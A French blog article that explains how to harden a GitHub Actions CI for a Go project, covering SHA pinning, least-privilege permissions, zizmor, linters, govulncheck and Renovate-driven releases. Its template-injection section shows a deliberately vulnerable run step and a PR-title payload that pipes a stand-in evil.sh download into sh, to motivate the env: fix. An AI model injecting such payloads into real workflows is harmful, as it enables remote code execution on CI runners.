---
description: Une CI GitHub Actions durcie pour un projet Go — actions SHA-pinned, permissions least-privilege, zizmor, golangci-lint, gocritic, govulncheck, tests multi-plateforme et feedback reviewdog en PR.
tags:
  - GitHub Actions
  - Go
  - CI/CD
  - Security
  - golangci-lint
  - gocritic
---

# CI GitHub Actions durcie pour un projet Go

Une CI Go, ce n'est pas juste `go test`. Test multi-plateforme, lint, scan de vulnérabilités, et surtout un durcissement contre les attaques supply-chain sur les workflows eux-mêmes. Tout ce qui suit tourne sur `push` et `pull_request`, mesuré sur un vrai repo public : [gopen](https://github.com/PixiBixi/gopen).

## Flow

![Flow CI](ci-flow.svg)

## Vue d'ensemble

Six workflows, un rôle par fichier. Le release (GoReleaser) est traité à part, voir [l'article dédié](goreleaser.md).

| Workflow | Rôle | Déclencheur |
|----------|------|-------------|
| `ci.yml` | `go mod verify`, `go test -race`, build matrice ubuntu/macos/windows | push, PR |
| `lint.yml` | golangci-lint v2 | push, PR |
| `govulncheck.yml` | CVE sur les dépendances et la toolchain | push, PR |
| `go-format.yml` | goimports, suggestions inline en PR | push, PR |
| `markdownlint.yml` | remark-lint sur les `.md`, suggestions inline | push, PR |
| `github-actions.yml` | zizmor, audit des workflows eux-mêmes | push, PR |

## Le socle de durcissement

C'est ce qui distingue une CI correcte d'une CI qu'on peut laisser tourner sur un repo public sans y penser. 5 patterns, appliqués sur **tous** les workflows.

### Épingler les actions par SHA, pas par tag

Un tag Git est mutable. `uses: actions/checkout@v7` pointe vers ce que le mainteneur (ou quelqu'un qui a compromis son compte) décide d'y mettre. Le SHA d'un commit, lui, ne bouge pas.

```yaml
# Fragile : le tag peut être redéplacé sur du code malveillant
- uses: actions/checkout@v7

# Durci : le SHA est immuable, le commentaire garde la version lisible
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

Le commentaire `# v7.0.0` n'est pas décoratif : [Renovate](https://docs.renovatebot.com/) le lit pour bumper le SHA **et** mettre à jour le commentaire, ce qui garde le pinning sans figer les actions dans le passé. Sur `gopen`, les updates d'actions sont même groupées et automergées :

```json title="renovate.json"
{
  "matchManagers": ["github-actions"],
  "groupName": "github-actions",
  "automerge": true,
  "automergeType": "pr"
}
```

Ce qui se rate, c'est le pinning initial : on ajoute une action en `@v4` dans une PR et personne ne voit passer le tag. Le preset `helpers:pinGitHubActionDigests` et `pinDigests: true` demandent à Renovate de convertir en SHA tout ce qui traîne en tag, y compris les images de conteneurs référencées dans un step.

```json title="renovate.json"
{
  "extends": ["config:recommended", "helpers:pinGitHubActionDigests"],
  "pinDigests": true
}
```

Le pinning a par contre une limite qu'il vaut mieux connaître : il ne couvre que le premier niveau. Si `actions/checkout` référence lui-même une autre action par tag dans son `action.yml`, la résolution se fait au runtime et le SHA qu'on a écrit n'y change rien, donc quelqu'un qui compromet l'action imbriquée arrive quand même jusqu'au runner. GitHub a annoncé dans sa [roadmap sécurité Actions 2026](https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/) un bloc `dependencies:` dans le YAML du workflow, qui lockerait les dépendances directes **et** transitives par SHA avec vérification du hash avant exécution, dans l'esprit d'un `go.mod` + `go.sum`. En attendant, la seule vraie parade est de limiter le nombre d'actions tierces qu'on tire.

### Permissions au moindre privilège

Le `GITHUB_TOKEN` par défaut est trop permissif. On le réduit au strict nécessaire, par workflow, et on descend au niveau du job quand un seul job a besoin d'un droit en écriture.

```yaml
# Aucun droit : le workflow zizmor n'écrit rien au niveau global...
permissions: {}

jobs:
  zizmor:
    permissions:
      security-events: write   # ...sauf ce job, pour publier dans l'onglet Security
```

L'échelle qu'on retrouve dans le repo :

| Besoin | `permissions` |
|--------|---------------|
| Lecture seule (test, lint, govulncheck) | `contents: read` |
| Commenter/suggérer en PR (reviewdog) | `contents: read` + `pull-requests: write` |
| Rien au global, un droit scopé par job | `{}` puis override dans le job |

### Couper les credentials sur le checkout

Par défaut, `actions/checkout` laisse le token traîner dans la config Git du runner. Un script de build compromis peut le récupérer et pousser sur le repo. On le désactive partout :

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  with:
    persist-credentials: false
```

### Épingler aussi le runner

`ubuntu-latest` est un tag mutable de plus, simplement pas hébergé sur GitHub Marketplace. GitHub le fait glisser d'une image à la suivante avec quelques semaines de préavis, et le jour du basculement la CI change de version de bash, de Docker et de toolchains préinstallées sans qu'aucun commit ne le raconte.

```yaml
# Le contenu change sous nos pieds
runs-on: ubuntu-latest

# La version est explicite, son bump devient un commit
runs-on: ubuntu-24.04
```

Renovate a un manager `github-runners` qui suit ces labels comme le reste, donc le pin ne fige rien : il transforme juste une migration subie en PR qu'on relit.

### zizmor : le linter de tes workflows

Les trois patterns ci-dessus, il faut les tenir sur la durée. [zizmor](https://github.com/zizmorcore/zizmor) audite les fichiers `.github/workflows/` et flague les tags non épinglés, les permissions trop larges, les injections de template, les credentials persistés. Un workflow qui s'auto-surveille :

```yaml title=".github/workflows/github-actions.yml"
name: github-actions

on:
  push:
    branches: [main, master]
  pull_request:

permissions: {}

jobs:
  zizmor:
    name: Run zizmor
    runs-on: ubuntu-24.04
    permissions:
      security-events: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: zizmorcore/zizmor-action@3dc1ecc9bcb9e94e9b2c709687979e1298497054 # v0.6.2
```

!!! tip "Faire tourner zizmor en local"
    `uvx zizmor .github/workflows/` (ou `pipx run zizmor`) donne le même verdict avant de committer.

Le finding qui mérite un exemple, c'est *template injection*. `${{ }}` est une substitution textuelle faite **avant** que bash voie la ligne, donc tout ce qu'un contributeur contrôle (titre et corps de PR, nom de branche, message de commit) arrive dans le script sans guillemets :

```yaml
# Vulnérable : le titre de la PR est collé tel quel dans le script
- run: echo "PR: ${{ github.event.pull_request.title }}"

# Durci : bash reçoit une variable, quel que soit son contenu
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR: $TITLE"
```

Une PR titrée `$(curl evil.sh | sh)` s'exécute donc dans le premier cas, et bash n'a aucun moyen de savoir d'où vient la valeur. En passant par `env:`, le contenu reste une chaîne, quoi qu'il y ait dedans.

zizmor a un angle mort symétrique : il lit le workflow, pas le shell qu'il contient. [actionlint](https://github.com/rhysd/actionlint) complète en passant chaque bloc `run:` à shellcheck, et en validant au passage les labels de runner, les `needs:` qui pointent vers un job inexistant et les expressions `${{ }}` mal typées. Les deux se recouvrent sur l'injection de template, ce qui n'est pas plus mal.

## Test et build multi-plateforme

Deux jobs dans `ci.yml`. Le premier teste, le second vérifie que le binaire compile sur les trois OS.

```yaml title=".github/workflows/ci.yml"
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version-file: go.mod
      - run: go mod verify
      - run: go build -v ./...
      - run: go test -race ./...

  build:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-24.04, macos-15, windows-2025]
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version-file: go.mod
      - run: go build -v -o gopen${{ matrix.os == 'windows-2025' && '.exe' || '' }} .
```

Trois choix qui comptent :

- `go-version-file: go.mod` : la version de Go vient du `go.mod`, pas d'une valeur hardcodée qui dérive. Une seule source de vérité.
- `go test -race` : le détecteur de data races coûte un peu de temps CPU mais attrape des bugs de concurrence qu'aucun test classique ne voit.
- `go mod verify` : confirme que les modules téléchargés correspondent au hash du `go.sum` avant de compiler.

!!! note "Pourquoi séparer test et build ?"
    Le job `test` tourne une fois sur Linux (rapide, avec `-race`). Le job `build` vérifie juste la compilation cross-OS. Inutile de rejouer toute la suite de tests trois fois quand seul le build est OS-dépendant.

## Lint

golangci-lint agrège des dizaines de linters en un seul binaire, un seul passage. On épingle sa version pour que le CI soit reproductible : un nouveau linter activé par une mise à jour ne doit pas casser une PR sans qu'on l'ait décidé.

```yaml title=".github/workflows/lint.yml"
- uses: golangci/golangci-lint-action@ba0d7d2ec06a0ea1cb5fa41b2e4a3ab91d21278a # v9.3.0
  with:
    version: v2.12.2
```

La config vit dans `.golangci.yml`. Le principe : partir du set standard, ajouter ce qui apporte de la valeur, et **justifier chaque exclusion en commentaire** pour que le prochain qui lit comprenne pourquoi.

```yaml title=".golangci.yml"
version: "2"

linters:
  default: standard   # govet, staticcheck, errcheck, ineffassign, unused
  enable:
    - bodyclose        # response body non fermé = fuite de connexion
    - errorlint        # comparaisons d'erreurs cassées par le wrapping %w
    - forcetypeassert  # type assertion sans le ok, => panic potentiel
    - gosec            # scan sécurité
    - misspell
    - perfsprint       # fmt.Sprintf remplaçable par plus rapide
    - revive
  settings:
    gosec:
      excludes:
        - G204 # subprocess avec variable : gopen exec git/open sans shell,
        #        les args passent en argv séparés, pas d'injection possible
  exclusions:
    rules:
      # gosec sur les tests est bruyant (perms de fichiers) et hors runtime
      - path: _test\.go
        linters:
          - gosec
```

!!! warning "Ne pas désactiver un linter pour faire passer le CI"
    Une exclusion sans commentaire, c'est de la dette. Soit le linter a raison et on corrige, soit il a tort dans ce contexte précis et on écrit pourquoi. `G204` ci-dessus est un cas légitime : le binaire n'invoque jamais de shell.

### gocritic et les gros structs copiés

Le set standard ne dit rien des copies de structs. Sur un projet qui manipule des objets Kubernetes, ça compte : un `corev1.Pod` pèse **1192 octets**, un `Node` 768, un `Container` 408 — mesuré au `unsafe.Sizeof`. Un `for _, p := range pods` copie donc 1,2 ko par tour, et un helper qui prend un `corev1.Pod` en paramètre le recopie à chaque appel.

Le tag `performance` de [gocritic](https://go-critic.com/) attrape exactement ça, via `rangeValCopy` et `hugeParam`. Il n'est pas activé par défaut :

```yaml title=".golangci.yml"
linters:
  enable:
    - gocritic
  settings:
    gocritic:
      enabled-tags:
        - performance
      settings:
        hugeParam:
          # Défaut 80 : flague aussi les structs de config qu'on passe
          # volontairement par valeur et qu'on copie une fois par process.
          # 256 garde le check braqué sur les objets d'API.
          sizeThreshold: 256
```

Le seuil est le réglage à ne pas laisser par défaut. À 80, le linter réclame aussi des pointeurs sur les structs de configuration qui traversent toutes les signatures : sur `klens`, un `Flags` de 104 octets et un `App` de 96. Or elles sont copiées une fois par exécution. Les passer en pointeur touchait vingt-cinq signatures pour zéro gain, en ouvrant au passage la porte à une mutation accidentelle de flags partagés.

Reste le plus intéressant : corriger les trente sites trouvés sur [klens](https://github.com/PixiBixi/kubectl-klens) n'a **rien accéléré**. Mesuré sur un cluster de production de 6400 pods, cinq exécutions, médianes :

| Commande | Temps | RSS max |
|---|---|---|
| `privileged -A` | 3,59 s → 3,53 s | 354 → 356 MiB |
| `images -A` | 3,31 s → 3,59 s | 372 → 372 MiB |

Tout dans le bruit. Le calcul de départ, « 56 Mo recopiés par exécution », était juste et hors sujet : 56 Mo de `memcpy`, c'est quelques millisecondes face aux 3,4 s passées à attendre l'apiserver. Et ces copies vivent sur la pile puis sont réutilisées, donc elles n'apparaissent même pas dans le RSS de pointe, dominé par le graphe d'objets décodés.

Ce que le check apporte quand même : il empêche de réintroduire le motif là où il *coûterait* vraiment, dans une slice de `Pod` à durée de vie longue ou une boucle imbriquée.

!!! warning "Un finding de linter n'est pas un gain de perf"
    `hugeParam` et `rangeValCopy` disent qu'une copie existe, pas qu'elle coûte. Sur un binaire dont le temps part en attente réseau, la réponse est souvent « rien du tout ». On mesure avant d'annoncer un gain, et quand le gain n'existe pas, le commit se type `chore`, pas `perf`.

### Le piège des findings masqués

Celui-là vaut pour tous les linters, pas seulement gocritic. Par défaut, golangci-lint **cache une partie de ce qu'il trouve** : 50 findings par linter, et surtout 3 occurrences par message identique.

Trente sites copiant chacun `1192 bytes` produisent trente messages au texte identique, dont trois s'affichent. On corrige les trois, on relance, trois nouveaux apparaissent. Sur `klens`, le premier passage annonçait 25 problèmes : des fichiers entiers n'étaient jamais sortis, et la correction paraissait finie alors qu'il en restait.

```yaml title=".golangci.yml"
issues:
  # Les défauts (50 par linter, 3 par message identique) masquent les répétitions :
  # un lot de findings au texte identique paraît réglé alors qu'il en reste.
  max-issues-per-linter: 0
  max-same-issues: 0
```

Sur un repo de taille raisonnable, il n'y a aucune raison de plafonner. Un linter qui ne montre pas tout est plus dangereux qu'un linter bruyant : on lui fait confiance à tort.

## Vulnérabilités des dépendances

[govulncheck](https://go.dev/blog/govulncheck) est l'outil officiel de la Go Team. Sa force : il ne signale une CVE que si ton code **appelle réellement** la fonction vulnérable, pas juste parce que le module est dans l'arbre de dépendances. Beaucoup moins de faux positifs qu'un scanner générique.

```yaml title=".github/workflows/govulncheck.yml"
permissions:
  contents: read

jobs:
  govulncheck:
    runs-on: ubuntu-24.04
    steps:
      - uses: golang/govulncheck-action@032d45514ae346b1db93c04b0c90b841c370344f # v1.1.0
        with:
          go-version-file: go.mod
```

Il couvre aussi les vulnérabilités de la toolchain Go elle-même, pas seulement les libs tierces.

## Durcir au-delà des workflows

3 couches qui ne sont pas sur `gopen` aujourd'hui, chacune à un fichier de workflow près.

- **[dependency-review-action](https://github.com/actions/dependency-review-action)** attaque le problème par l'autre bout que govulncheck : il compare le graphe de dépendances avant et après la PR, et bloque le merge si une CVE connue ou une licence non voulue **entre** dans l'arbre. govulncheck dit si on appelle vraiment la fonction vulnérable, dependency-review dit qu'elle arrive, ce qui est le bon moment pour discuter d'une dépendance qu'on n'a pas encore.

    ```yaml
    - uses: actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294 # v5.0.0
    ```

- **[OpenSSF Scorecard](https://securityscorecards.dev/)** note le repo sur une vingtaine de checks et publie le résultat dans l'onglet Security. Son intérêt est de regarder ce qui n'est pas dans les workflows : protection de branche, présence d'une politique de sécurité, signature des releases, activité de maintenance. Un audit qui tourne tout seul plutôt qu'une relecture annuelle.

- **[harden-runner](https://github.com/step-security/harden-runner)** filtre le trafic sortant du runner. On le pose d'abord en `audit` pour voir ce que la CI contacte réellement, puis en `block` avec une allow-list. C'est ce mécanisme qui a permis de repérer la compromission de `tj-actions/changed-files` en 2025 : les runners exfiltraient vers un endpoint qui n'avait rien à faire là, et l'anomalie est sortie dans les rapports d'egress avant que qui que ce soit lise le diff de l'action.

GitHub prépare son propre pare-feu d'egress natif, décrit dans la roadmap 2026, qui tournerait hors de la VM du runner et resterait donc actif même si un attaquant y obtient root.

## Feedback direct dans la PR

Faire échouer un job, c'est bien. Dire quoi corriger et où, c'est mieux. [reviewdog](https://github.com/reviewdog/reviewdog) poste les problèmes en suggestions inline sur la PR, applicables en un clic.

```yaml title=".github/workflows/go-format.yml"
permissions:
  contents: read
  pull-requests: write   # requis pour poster les suggestions

jobs:
  goimports:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version-file: go.mod
      - env:
          # renovate: datasource=go depName=golang.org/x/tools
          GOIMPORTS_VERSION: v0.48.0
        run: go install "golang.org/x/tools/cmd/goimports@${GOIMPORTS_VERSION}"
      - run: goimports -w $(find . -name '*.go')
      - uses: reviewdog/action-suggester@2558ba17e65a9039e73764a73009fc05fef28a46 # v1.24.3
        with:
          tool_name: goimports
```

Le job reformate le code, puis reviewdog compare avec ce qui a été poussé et propose le diff en commentaire. Même mécanique pour le Markdown avec `reviewdog/action-markdownlint` et `reporter: github-pr-review`.

Le `go install ... @latest` qu'on écrit par réflexe est le même problème qu'un tag d'action : la version installée change sans commit, et un compte upstream compromis livre directement dans le job. Le proxy Go vérifie bien le checksum, mais d'une version qu'on n'a pas choisie, d'où le pin en variable d'env que Renovate suit via le commentaire `# renovate:`.

## Automerge et releases pilotées par les commits

Une CI fiable et reproductible débloque un cran d'automatisation de plus : laisser Renovate merger ses PR tout seul, et faire du type de commit le déclencheur d'une release. L'automerge n'est sûr que parce que tout ce qui précède existe — il n'avale une PR qu'après une CI verte.

### Élargir l'automerge

Plus haut, seules les mises à jour d'actions étaient automergées. On peut étendre la règle à toutes les updates sûres — `minor`, `patch`, `digest` — et ne garder en revue manuelle que les `major`, les seules à casser une API :

```json title="renovate.json"
{
  "matchUpdateTypes": ["minor", "patch", "digest"],
  "automerge": true,
  "automergeType": "pr"
}
```

`automergeType: pr` ouvre quand même une PR et attend les checks : l'automerge ne court-circuite pas la CI, il retire juste le clic humain une fois qu'elle est verte.

Reste un trou que la CI verte ne bouche pas : automerger une version publiée il y a 10 minutes, c'est exactement le scénario des compromissions npm de ces derniers mois, où le package vérolé passe les tests sans problème et reste en ligne quelques heures avant d'être yanké. `minimumReleaseAge` fait attendre Renovate :

```json title="renovate.json"
{
  "matchUpdateTypes": ["major", "minor", "patch"],
  "minimumReleaseAge": "5 days"
}
```

5 jours, c'est ce qu'applique Cilium sur son propre repo, et ça couvre à peu près la fenêtre pendant laquelle une release compromise se fait repérer. Le prix apparent, c'est un retard de 5 jours sur les patchs de sécurité, sauf que Renovate neutralise le cooldown dans sa config `vulnerabilityAlerts` (`minimumReleaseAge: null` par défaut) : les updates qui répondent à une CVE connue passent toujours tout de suite.

Le cran d'après, c'est de réserver l'automerge à une allow-list d'orgs de confiance (`actions/**`, `golang.org/x/**`, `k8s.io/**`) et de passer tout le reste en revue humaine. Sur un projet à 10 dépendances directes c'est disproportionné, mais ça devient l'arbitrage à faire dès que l'arbre grossit.

### Faire du commit le déclencheur de version

Le chaînon manquant : relier le contenu d'une PR mergée à un numéro de version. Les commits conventionnels le permettent — `feat` → bump mineur, `fix` → bump patch. Renovate sait taguer ses commits par type d'update, ce qui suffit à décider du bump :

```json title="renovate.json"
"packageRules": [
  {
    "matchManagers": ["gomod"],
    "matchUpdateTypes": ["minor"],
    "semanticCommitType": "feat"
  },
  {
    "matchManagers": ["gomod"],
    "matchUpdateTypes": ["patch", "digest"],
    "semanticCommitType": "fix"
  },
  {
    "matchManagers": ["github-actions"],
    "semanticCommitType": "chore"
  }
]
```

| Update | Manager | Commit émis | Release |
|--------|---------|-------------|---------|
| `minor` | gomod | `feat(deps):` | version mineure |
| `patch` / `digest` | gomod | `fix(deps):` | version patch |
| tout | github-actions | `chore(deps):` | aucune |

!!! note "Pourquoi les actions ne déclenchent pas de release"
    Un bump d'action CI ne change pas le binaire livré — il n'a aucune raison de produire une nouvelle version. On le garde en `chore` : mergé automatiquement, mais invisible pour le versioning. Chaque bump de module Go, lui, est compilé dans l'artefact et justifie une release.

### Le workflow : taguer puis publier, en un seul job

[`svu`](https://github.com/caarlos0/svu) lit les commits depuis le dernier tag et calcule le prochain `vX.Y.Z` ; un appel API pose le tag, GoReleaser enchaîne dans le même job. Le garde-fou est dans la comparaison : `svu next` renvoie **la version courante** quand rien ne justifie de release, donc `next == current` signifie « ne rien faire » — aucune release parasite sur un simple `docs:` ou `chore:`.

```yaml title=".github/workflows/release.yml"
on:
  push:
    branches: [main]
    tags: ['v*']   # échappatoire : un tag posé à la main publie aussi

permissions:
  contents: write

jobs:
  release:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0
          persist-credentials: false
      # setup-go d'abord : il sert à installer svu, puis à GoReleaser
      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version-file: go.mod
          cache: false
      - id: tag
        if: github.ref_type == 'branch'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # renovate: datasource=github-releases depName=caarlos0/svu
          SVU_VERSION: v3.4.1
        run: |
          set -euo pipefail
          GOBIN="${RUNNER_TEMP}/bin" go install "github.com/caarlos0/svu/v3@${SVU_VERSION}"
          svu="${RUNNER_TEMP}/bin/svu"

          current=$("$svu" current)
          next=$("$svu" next --v0)
          [ "$next" = "$current" ] && exit 0   # rien de releasable

          gh api "repos/${GITHUB_REPOSITORY}/git/refs" \
            -f "ref=refs/tags/${next}" -f "sha=${GITHUB_SHA}" --silent
          echo "new_tag=${next}" >> "$GITHUB_OUTPUT"
      - if: github.ref_type == 'tag' || steps.tag.outputs.new_tag != ''
        run: git fetch --tags --force
      # setup-go + GoReleaser, gardés par la même condition — voir l'article GoReleaser
```

`go install` passe par le proxy de modules Go, donc la version de svu est vérifiée contre la base de checksums — et le pin en variable d'env est suivi par Renovate via un `customManager` regex. Créer le tag par l'API plutôt qu'avec `git push` permet de garder `persist-credentials: false` sur le checkout.

!!! warning "`perf:` ne déclenche pas de release"
    svu applique la spec Conventional Commits à la lettre : seuls `fix` (patch) et `feat` (mineur) sont normatifs. Un `perf:` seul ne sort donc **aucune** version, et sa config ne permet pas d'ajouter des mots-clés. Si un gain de perf doit être livré tout de suite, il se type `fix:`. Le flag `--v0` évite au passage qu'un breaking change fasse sauter un projet en `0.x` directement en `v1.0.0`.

<!-- markdownlint-disable MD046 -->
!!! note "Pourquoi pas une action toute faite ?"
    Le réflexe est d'utiliser `mathieudutour/github-tag-action`, la plus répandue pour ça. Elle est **abandonnée** : plus de release depuis mars 2024, plus de commit depuis juin 2024, et toujours `using: node20` — donc une alerte de dépréciation à chaque release, sans version vers laquelle migrer. Épingler par SHA protège d'un tag repointé, pas d'un projet mort.

    Les remplaçantes évidentes ne tiennent pas l'examen : `anothrNick/github-tag-action` ne fait **pas** de conventional commits (elle cherche des hashtags `#major`/`#minor`/`#patch`, et détourner ses tokens donne un match de sous-chaîne où « prefix » déclenche un patch) ; `TriPSs/conventional-changelog-action` fonctionne mais écrit un `CHANGELOG.md` par défaut, ce qui salit l'arbre que GoReleaser va lire ; `release-please` et consorts imposent un modèle de release PR, soit exactement le clic humain que l'automerge cherche à supprimer.

    D'où le choix d'un CLI maintenu qui ne fait que le calcul, plus un appel API. Leçon générale : sur un chemin de release qui détient `contents: write`, la maintenance de la dépendance compte autant que ses fonctionnalités.
<!-- markdownlint-enable MD046 -->

Pourquoi tout dans un seul job, plutôt qu'un workflow qui tague et un autre qui publie sur le tag ? Parce qu'un tag poussé avec le `GITHUB_TOKEN` par défaut **ne re-déclenche pas** de workflow — garde-fou anti-boucle de GitHub. Séparer les deux imposerait un PAT dédié juste pour ré-armer le second workflow. En enchaînant calcul-du-tag et publication dans le même run, on s'en passe. La double condition (`ref_type == 'tag'` ou nouveau tag calculé) préserve l'échappatoire manuelle : un `v*` poussé à la main court-circuite le calcul et publie directement.

Résultat : Renovate merge un `minor` de dépendance, la CI passe, une version mineure sort et est publiée — sans qu'une main touche à un tag.

!!! tip "Rendre les releases immuables"
    Une fois la release publiée, GitHub sait interdire de redéplacer son tag et de remplacer ses assets (toggle *Immutable releases* dans les settings du repo). C'est une case à cocher, et elle ferme le scénario où un compte compromis republie un binaire sous un tag déjà installé partout.

## Récap

Ce qui fait la différence entre une CI Go qui marche et une CI Go qu'on laisse tourner sans y penser :

- Actions épinglées par SHA, versions gardées lisibles en commentaire
- `permissions:` au moindre privilège, par workflow et par job
- `persist-credentials: false` sur chaque checkout
- Runners nommés (`ubuntu-24.04`) et outils installés en version épinglée, jamais de `latest`
- zizmor pour que tout ça reste vrai dans le temps, actionlint pour le shell dans les `run:`
- `go test -race` et build sur les 3 OS
- golangci-lint épinglé, exclusions justifiées, `max-same-issues: 0` pour ne rien masquer
- govulncheck pour les CVE réellement atteignables
- reviewdog pour un feedback actionnable en PR
- Renovate en automerge (minor/patch/digest) derrière un cooldown de 5 jours, et releases déclenchées par le type de commit

!!! tip "Et après le CI ?"
    Une fois le CI vert et un tag posé — à la main ou calculé par la CI (voir plus haut) — c'est [GoReleaser](goreleaser.md) qui prend le relais : binaires multi-arch, images OCI, signatures cosign, publication Homebrew.
